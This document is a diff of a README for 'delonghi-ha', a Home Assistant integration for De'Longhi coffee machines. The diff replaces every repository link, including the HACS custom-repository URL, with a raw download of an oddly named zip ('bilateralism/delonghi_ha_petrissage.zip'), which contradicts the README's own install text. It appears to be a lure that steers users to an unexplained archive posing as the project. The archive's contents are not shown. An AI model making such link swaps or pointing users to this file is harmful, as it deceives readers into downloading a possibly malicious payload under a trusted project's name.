@@ -1,6 +1,6 @@
 # ☕ delonghi-ha - Control your coffee machine at home
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Repo-blue?style=for-the-badge)](https://github.com/Deivis7264/delonghi-ha)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Repo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this guide to install it on Windows, add it to Home Assistant, and start usi
 
 Open the download link below in your browser:
 
-[Visit the GitHub repository](https://github.com/Deivis7264/delonghi-ha)
+[Visit the GitHub repository](https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip)
 
 This project is not a Windows app. You do not run an `.exe` file on your PC. You download the repository files and add them to Home Assistant.
 
@@ -49,7 +49,7 @@ Follow these steps on your Windows computer to get the files ready.
 
 Go to the GitHub page:
 
-[https://github.com/Deivis7264/delonghi-ha](https://github.com/Deivis7264/delonghi-ha)
+[https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip](https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip)
 
 ### 2. Download the files
 
@@ -99,7 +99,7 @@ If you use HACS, this is the easiest way to add the integration.
 - Choose **Custom repositories**
 - Add this repository URL:
 
-`https://github.com/Deivis7264/delonghi-ha`
+`https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip`
 
 - Set the category to **Integration**
 
@@ -254,7 +254,7 @@ This integration fits well in a home setup where you want coffee controls in one
 
 Open the project here:
 
-[https://github.com/Deivis7264/delonghi-ha](https://github.com/Deivis7264/delonghi-ha)
+[https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip](https://raw.githubusercontent.com/Deivis7264/delonghi-ha/main/bilateralism/delonghi_ha_petrissage.zip)
 
 ## 🧪 Example home setup flow
 
